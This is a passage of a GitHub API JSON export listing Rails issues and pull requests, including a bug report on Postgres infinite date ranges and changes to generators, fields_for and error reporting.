            "+1": 1,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51113/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51112",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51112/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51112/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51112/events",
        "html_url": "https://github.com/rails/rails/pull/51112",
        "id": 2139611383,
        "node_id": "PR_kwDNIULOZyQ-kQ",
        "number": 51112,
        "title": "`Rails::Generators::GeneratedAttribute#to_s`",
        "user": {
            "login": "dorianmariecom",
            "id": 58794487,
            "node_id": "MDQ6VXNlcjU4Nzk0NDg3",
            "avatar_url": "https://avatars.githubusercontent.com/u/58794487?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/dorianmariecom",
            "html_url": "https://github.com/dorianmariecom",
            "followers_url": "https://api.github.com/users/dorianmariecom/followers",
            "following_url": "https://api.github.com/users/dorianmariecom/following{/other_user}",
            "gists_url": "https://api.github.com/users/dorianmariecom/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/dorianmariecom/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/dorianmariecom/subscriptions",
            "organizations_url": "https://api.github.com/users/dorianmariecom/orgs",
            "repos_url": "https://api.github.com/users/dorianmariecom/repos",
            "events_url": "https://api.github.com/users/dorianmariecom/events{/privacy}",
            "received_events_url": "https://api.github.com/users/dorianmariecom/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 6,
        "created_at": "2024-02-16T23:09:56Z",
        "updated_at": "2024-02-21T09:39:13Z",
        "closed_at": "2024-02-20T22:24:51Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51112",
            "html_url": "https://github.com/rails/rails/pull/51112",
            "diff_url": "https://github.com/rails/rails/pull/51112.diff",
            "patch_url": "https://github.com/rails/rails/pull/51112.patch",
            "merged_at": "2024-02-20T22:24:51Z"
        },
        "body": "### Motivation / Background\r\n\r\nI'm writing my own generator (concept) and would like to easily call the model generator\r\n\r\nThis Pull Request has been created because it wasn't easy to convert a generated attribute (options passed to the generator) to a string to be passed to another generator\r\n\r\n### Detail\r\n\r\nThis Pull Request changes `Rails::Generators::GeneratedAttribute#to_s`\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51112/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51112/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51111",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51111/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51111/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51111/events",
        "html_url": "https://github.com/rails/rails/issues/51111",
        "id": 2139447215,
        "node_id": "I_kwDNIULOf4Vfrw",
        "number": 51111,
        "title": "Rails 7.1.* Deserializes Date Range with Infinities incorrectly with Postgres adapter",
        "user": {
            "login": "brettwgreen",
            "id": 1385686,
            "node_id": "MDQ6VXNlcjEzODU2ODY=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1385686?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/brettwgreen",
            "html_url": "https://github.com/brettwgreen",
            "followers_url": "https://api.github.com/users/brettwgreen/followers",
            "following_url": "https://api.github.com/users/brettwgreen/following{/other_user}",
            "gists_url": "https://api.github.com/users/brettwgreen/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/brettwgreen/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/brettwgreen/subscriptions",
            "organizations_url": "https://api.github.com/users/brettwgreen/orgs",
            "repos_url": "https://api.github.com/users/brettwgreen/repos",
            "events_url": "https://api.github.com/users/brettwgreen/events{/privacy}",
            "received_events_url": "https://api.github.com/users/brettwgreen/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 126910270,
                "node_id": "MDU6TGFiZWwxMjY5MTAyNzA=",
                "url": "https://api.github.com/repos/rails/rails/labels/With%20reproduction%20steps",
                "name": "With reproduction steps",
                "color": "009800",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": {
            "url": "https://api.github.com/repos/rails/rails/milestones/88",
            "html_url": "https://github.com/rails/rails/milestone/88",
            "labels_url": "https://api.github.com/repos/rails/rails/milestones/88/labels",
            "id": 10422595,
            "node_id": "MI_kwDNIULOAJ8JQw",
            "number": 88,
            "title": "7.1.4",
            "description": null,
            "creator": {
                "login": "rafaelfranca",
                "id": 47848,
                "node_id": "MDQ6VXNlcjQ3ODQ4",
                "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
                "gravatar_id": "",
                "url": "https://api.github.com/users/rafaelfranca",
                "html_url": "https://github.com/rafaelfranca",
                "followers_url": "https://api.github.com/users/rafaelfranca/followers",
                "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
                "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
                "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
                "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
                "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
                "repos_url": "https://api.github.com/users/rafaelfranca/repos",
                "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
                "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
                "type": "User",
                "site_admin": false
            },
            "open_issues": 9,
            "closed_issues": 5,
            "state": "open",
            "created_at": "2024-01-15T23:00:48Z",
            "updated_at": "2024-02-27T02:00:26Z",
            "due_on": null,
            "closed_at": null
        },
        "comments": 1,
        "created_at": "2024-02-16T20:46:17Z",
        "updated_at": "2024-02-17T00:32:06Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "body": "### Steps to reproduce\r\n- Create a table with a postgres date range column (tsrange for example)\r\n- Create an entry in that table witha date range that has infinity on one end and save it\r\n  `range_test = RangeTest.create!(date_range: (DateTime.new(2024,1,1)...DateTime::Infinity.new))`\r\n- Reload that entry from the database (deserialize it)\r\n  `range_test.reload`\r\n- Look at the infinite part of the range now and it no longer is infinite... it is nil\r\n  `puts range_test.date_rage.end.class` returns `NilClass`\r\n\r\nIn previous version of rails (7.0.8 for example), it actuallly returned a Float::INFINITY class... this was a little off, but closer to the mark than nil.\r\n\r\nAt least with that, we could to a check like `date_range.end.to_s == 'Infinity'` in our logic, which looks reasonable\r\n\r\n```ruby\r\nrequire \"bundler/inline\"\r\n\r\ngemfile(true) do\r\n  source \"https://rubygems.org\"\r\n\r\n  git_source(:github) { |repo| \"https://github.com/#{repo}.git\" }\r\n\r\n  # gem \"rails\", '= 7.0.8'\r\n  gem \"rails\", '~> 7.1.3'\r\n  # If you want to test against edge Rails replace the previous line with this:\r\n  # gem \"rails\", github: \"rails/rails\", branch: \"main\"\r\n\r\n  gem \"pg\"\r\nend\r\n\r\nrequire \"active_record\"\r\nrequire \"minitest/autorun\"\r\nrequire \"logger\"\r\n\r\n# You may need to change your pg settings accordingly\r\ndb_config = {\r\n  adapter: 'postgresql',\r\n  database: 'range_test',\r\n  host: '::1', # Change this to your PostgreSQL host\r\n  port: 5432,\r\n  username: 'postgres', # Change this to your PostgreSQL username\r\n  password: 'test'  # Change this to your PostgreSQL password\r\n}\r\n\r\nbegin\r\n  ActiveRecord::Base.establish_connection(db_config.except(:database))\r\n  ActiveRecord::Base.connection.drop_database(db_config[:database]) rescue nil\r\n  ActiveRecord::Base.connection.create_database(db_config[:database])\r\nend\r\nActiveRecord::Base.establish_connection(db_config)\r\nActiveRecord::Base.logger = Logger.new(STDOUT)\r\n\r\nActiveRecord::Schema.define do\r\n  create_table :range_tests do |t|\r\n    t.tsrange :date_range\r\n    t.timestamps\r\n  end\r\nend\r\n\r\nclass RangeTest < ActiveRecord::Base\r\nend\r\n\r\nclass BugTest < Minitest::Test\r\n  def test_date_range_infinity_deserialization\r\n    range = (DateTime.new(2024,1,1)...DateTime::Infinity.new)\r\n    range_test = RangeTest.create!(date_range: range)\r\n    assert_equal DateTime::Infinity, range_test.date_range.end.class\r\n    # Need to reload to deserialize the range back out from the DB to see the problem\r\n    range_test.reload\r\n    # Interestingly, even before rails 7.1.3, the end range would deserialize to a Float::INFINITY\r\n    # So we're checking the to_s representation to show the change in behavior\r\n    assert_equal \"Infinity\", range_test.date_range.end.to_s\r\n  end\r\nend\r\n```\r\n\r\n### Expected behavior\r\nFrankly, it was a _bit_ of a bug before in that this would return a Float::INFINITY object before, where it should have returned a DateTime::INFINITY. At least with that you could, for example, check `date_range.end.to_s == 'Infinity'` for some kind of logical checking for an infinite range start or end.\r\n\r\nReturning nil seems to be undocumented change in behavior at the very least.\r\n\r\n### Actual behavior\r\nThe date range returns a nil object for whichever end of the range may be infinite.\r\n\r\n### System configuration\r\n**Rails version**: 7.1.3\r\n\r\n**Ruby version**: 3.2.2\r\n\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51111/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51111/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51110",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51110/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51110/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51110/events",
        "html_url": "https://github.com/rails/rails/pull/51110",
        "id": 2139392405,
        "node_id": "PR_kwDNIULOZyE-Tg",
        "number": 51110,
        "title": "Accept a `child_index` lambda on `fields_for` with an argument",
        "user": {
            "login": "keegnotrub",
            "id": 1398,
            "node_id": "MDQ6VXNlcjEzOTg=",
            "avatar_url": "https://avatars.githubusercontent.com/u/1398?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/keegnotrub",
            "html_url": "https://github.com/keegnotrub",
            "followers_url": "https://api.github.com/users/keegnotrub/followers",
            "following_url": "https://api.github.com/users/keegnotrub/following{/other_user}",
            "gists_url": "https://api.github.com/users/keegnotrub/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/keegnotrub/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/keegnotrub/subscriptions",
            "organizations_url": "https://api.github.com/users/keegnotrub/orgs",
            "repos_url": "https://api.github.com/users/keegnotrub/repos",
            "events_url": "https://api.github.com/users/keegnotrub/events{/privacy}",
            "received_events_url": "https://api.github.com/users/keegnotrub/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 3666649,
                "node_id": "MDU6TGFiZWwzNjY2NjQ5",
                "url": "https://api.github.com/repos/rails/rails/labels/actionview",
                "name": "actionview",
                "color": "d7e102",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-16T20:19:57Z",
        "updated_at": "2024-02-16T21:47:33Z",
        "closed_at": null,
        "author_association": "NONE",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51110",
            "html_url": "https://github.com/rails/rails/pull/51110",
            "diff_url": "https://github.com/rails/rails/pull/51110.diff",
            "patch_url": "https://github.com/rails/rails/pull/51110.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\n<!--\r\nDescribe why this Pull Request needs to be merged. What bug have you fixed? What feature have you added? Why is it important?\r\nIf you are fixing a specific issue, include \"Fixes #ISSUE\" (replace with the issue number, remove the quotes) and the issue will be linked to this PR.\r\n-->\r\n\r\nWhile `fields_for` currently accepts a lambda as an argument for `child_index`, that lambda is called without any arguments. Being that we are enumerating the association on `fields_for` at the time the lambda is called, we have an opportunity to pass the child of the association down to the lambda.  This could simplify the case where you may want to use the `id` of an Active Record object as the index.  So with this change you could do something like this:\r\n\r\n```html.erb\r\n<%= author_form.fields_for :books, child_index: ->(book) { book.id } do |book_form| %>\r\n  <%= book_form.text_field :name %>\r\n<% end %>\r\n```\r\n\r\nPrior to this, you would have had to enumerate the association yourself:\r\n\r\n```html.erb\r\n<% author.books.each do |book| %>\r\n  <%= author_form.fields_for :books, book, child_index: book.id do |book_form| %>\r\n    <%= book_form.text_field :name %>\r\n  <% end %>\r\n<% end %>\r\n```\r\n\r\n### Detail\r\n\r\nAccepts passing the association's child as an argument in a lambda as the `child_index` option in `fields_for`.\r\n\r\n### Additional information\r\n\r\nUsed [PR 19661](https://github.com/rails/rails/pull/19661) as a guide when passing a lambda to `child_index` was originally introduced.\r\n\r\n\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51110/reactions",
            "total_count": 4,
            "+1": 2,
            "-1": 0,
            "laugh": 0,
            "hooray": 2,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51110/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51109",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51109/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51109/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51109/events",
        "html_url": "https://github.com/rails/rails/pull/51109",
        "id": 2139265027,
        "node_id": "PR_kwDNIULOZx9yZA",
        "number": 51109,
        "title": "Fix: Remove :source argument from report method call in 7-0-stable",
        "user": {
            "login": "wildmaples",
            "id": 25471753,
            "node_id": "MDQ6VXNlcjI1NDcxNzUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/25471753?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/wildmaples",
            "html_url": "https://github.com/wildmaples",
            "followers_url": "https://api.github.com/users/wildmaples/followers",
            "following_url": "https://api.github.com/users/wildmaples/following{/other_user}",
            "gists_url": "https://api.github.com/users/wildmaples/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/wildmaples/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/wildmaples/subscriptions",
            "organizations_url": "https://api.github.com/users/wildmaples/orgs",
            "repos_url": "https://api.github.com/users/wildmaples/repos",
            "events_url": "https://api.github.com/users/wildmaples/events{/privacy}",
            "received_events_url": "https://api.github.com/users/wildmaples/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-16T19:13:23Z",
        "updated_at": "2024-02-16T20:07:14Z",
        "closed_at": "2024-02-16T20:07:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51109",
            "html_url": "https://github.com/rails/rails/pull/51109",
            "diff_url": "https://github.com/rails/rails/pull/51109.diff",
            "patch_url": "https://github.com/rails/rails/pull/51109.patch",
            "merged_at": "2024-02-16T20:07:14Z"
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nIn the latest `7-0-stable` branch, we are seeing `ArgumentError: unknown keyword: :source` in rendered error reporting. \r\n\r\nThe ArgumentError happens because ActiveSupport::ErrorReporter#report does not take a :source argument. This change was added in: https://github.com/rails/rails/pull/51050/files#diff-604e899a364cb75951f10cc5cd430192c4133d7e221aebef398dda062cf97e18R18\r\n\r\n### Detail\r\n\r\nThis PR removes the source argument from the `#report` method call since we do not have the [updated method signature](https://github.com/rails/rails/blob/main/activesupport/lib/active_support/error_reporter.rb#L210) in 7.0. \r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51109/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51109/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51108",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51108/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51108/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51108/events",
        "html_url": "https://github.com/rails/rails/pull/51108",
        "id": 2139202840,
        "node_id": "PR_kwDNIULOZx6Rbg",
        "number": 51108,
        "title": "Remove :source argument from method call ",
        "user": {
            "login": "wildmaples",
            "id": 25471753,
            "node_id": "MDQ6VXNlcjI1NDcxNzUz",
            "avatar_url": "https://avatars.githubusercontent.com/u/25471753?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/wildmaples",
            "html_url": "https://github.com/wildmaples",
            "followers_url": "https://api.github.com/users/wildmaples/followers",
            "following_url": "https://api.github.com/users/wildmaples/following{/other_user}",
            "gists_url": "https://api.github.com/users/wildmaples/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/wildmaples/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/wildmaples/subscriptions",
            "organizations_url": "https://api.github.com/users/wildmaples/orgs",
            "repos_url": "https://api.github.com/users/wildmaples/repos",
            "events_url": "https://api.github.com/users/wildmaples/events{/privacy}",
            "received_events_url": "https://api.github.com/users/wildmaples/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-16T18:41:55Z",
        "updated_at": "2024-02-16T19:09:32Z",
        "closed_at": "2024-02-16T19:09:32Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51108",
            "html_url": "https://github.com/rails/rails/pull/51108",
            "diff_url": "https://github.com/rails/rails/pull/51108.diff",
            "patch_url": "https://github.com/rails/rails/pull/51108.patch",
            "merged_at": null
        },
        "body": "<!--\r\nThanks for contributing to Rails!\r\n\r\nPlease do not make *Draft* pull requests, as they still send\r\nnotifications to everyone watching the Rails repo.\r\n\r\nCreate a pull request when it is ready for review and feedback\r\nfrom the Rails team :).\r\n\r\nIf your pull request affects documentation or any non-code\r\nchanges, guidelines for those changes are [available\r\nhere](https://edgeguides.rubyonrails.org/contributing_to_ruby_on_rails.html#contributing-to-the-rails-documentation)\r\n\r\nAbout this template\r\n\r\nThe following template aims to help contributors write a good description for their pull requests.\r\nWe'd like you to provide a description of the changes in your pull request (i.e. bugs fixed or features added), motivation behind the changes, and complete the checklist below before opening a pull request.\r\n\r\nFeel free to discard it if you need to (e.g. when you just fix a typo). -->\r\n\r\n### Motivation / Background\r\n\r\nIn the latest `7-0-stable` branch, we are seeing `ArgumentError: unknown keyword: :source` in rendered error reporting. \r\n\r\nThe ArgumentError happens because ActiveSupport::ErrorReporter#report does not take a :source argument. This change was added in: \r\nhttps://github.com/rails/rails/pull/51050/files#diff-604e899a364cb75951f10cc5cd430192c4133d7e221aebef398dda062cf97e18R18\r\n\r\n\r\n### Detail\r\n\r\nThis PR removes the source argument from the `#report` method call. \r\n\r\n### Additional information\r\n\r\n<!-- Provide additional information such as benchmarks, reference to other repositories or alternative solutions. -->\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [ ] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51108/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51108/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51107",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51107/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51107/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51107/events",
        "html_url": "https://github.com/rails/rails/pull/51107",
        "id": 2139110540,
        "node_id": "PR_kwDNIULOZx1E6g",
        "number": 51107,
        "title": "Do not report rendered errors except 500",
        "user": {
            "login": "nvasilevski",
            "id": 5512772,
            "node_id": "MDQ6VXNlcjU1MTI3NzI=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5512772?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/nvasilevski",
            "html_url": "https://github.com/nvasilevski",
            "followers_url": "https://api.github.com/users/nvasilevski/followers",
            "following_url": "https://api.github.com/users/nvasilevski/following{/other_user}",
            "gists_url": "https://api.github.com/users/nvasilevski/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/nvasilevski/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/nvasilevski/subscriptions",
            "organizations_url": "https://api.github.com/users/nvasilevski/orgs",
            "repos_url": "https://api.github.com/users/nvasilevski/repos",
            "events_url": "https://api.github.com/users/nvasilevski/events{/privacy}",
            "received_events_url": "https://api.github.com/users/nvasilevski/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107189,
                "node_id": "MDU6TGFiZWwxMDcxODk=",
                "url": "https://api.github.com/repos/rails/rails/labels/actionpack",
                "name": "actionpack",
                "color": "FFF700",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 3,
        "created_at": "2024-02-16T17:53:50Z",
        "updated_at": "2024-02-16T21:40:03Z",
        "closed_at": "2024-02-16T19:35:25Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51107",
            "html_url": "https://github.com/rails/rails/pull/51107",
            "diff_url": "https://github.com/rails/rails/pull/51107.diff",
            "patch_url": "https://github.com/rails/rails/pull/51107.patch",
            "merged_at": "2024-02-16T19:35:25Z"
        },
        "body": "### TLDR Context\r\n\r\nhttps://github.com/rails/rails/pull/51050 change results in error tracking service being polluted with `ActionController::RoutingError` which are not actionable and we don't want them there\r\n\r\n\r\n### Context\r\nIn https://github.com/rails/rails/pull/51050/commits/4067c9565a5da78a72e375a2d959000147f02c34 `ActionDispatch::Executor` started to report all errors, even the ones that were \"handled\" by the application. This leads to errors like `ActionController::RoutingError` polluting error trackers while not being actionable since they do not represent an exceptional situation.\r\n\r\nThis commit changes the behavior to only report errors that are not considered \"handled\" based on the `ActionDispatch::ExceptionWrapper.rescue_responses` list.\r\n\r\n\r\n### Alternative solution\r\nWhat I have considered and what might actually be a better solution for the long-term is to report \"handled\" exceptions as `handled: true`. This way subscribers can decide how they want to proceed reporting something that has already been handled. Example: While I strongly believe that `ActionController::RoutingError` should not be presented on the error tracker in the same way as something like `raise \"boom\"`, I can see that some applications may want to soft-report them in a way that doesn't trigger any alerts and doesn't require any attention. For example It's totally expected to have `ActionController::RoutingError` exceptions but if the number of `ActionController::RoutingError` spikes it may indicate that either some link that used to be accessible became unaccessible or a wrong link was posted/rendered somewhere which makes such event actionable and worth reporting. \r\n\r\n\r\nBut regardless, `ActionController::RoutingError` (and similar) exceptions should not suddenly be reported as part of a patch version upgrade. It should be a major change with perhaps a configuration option to allow applications to adapt and make a decision on how to proceed. \r\n\r\nI'm open for the discussion and eager to learn what are yours expectations on this behavior! ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51107/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51107/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51106",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51106/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51106/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51106/events",
        "html_url": "https://github.com/rails/rails/pull/51106",
        "id": 2139036490,
        "node_id": "PR_kwDNIULOZxw5cA",
        "number": 51106,
        "title": "Add .tool-versions with yarn and nodejs",
        "user": {
            "login": "dorianmariecom",
            "id": 58794487,
            "node_id": "MDQ6VXNlcjU4Nzk0NDg3",
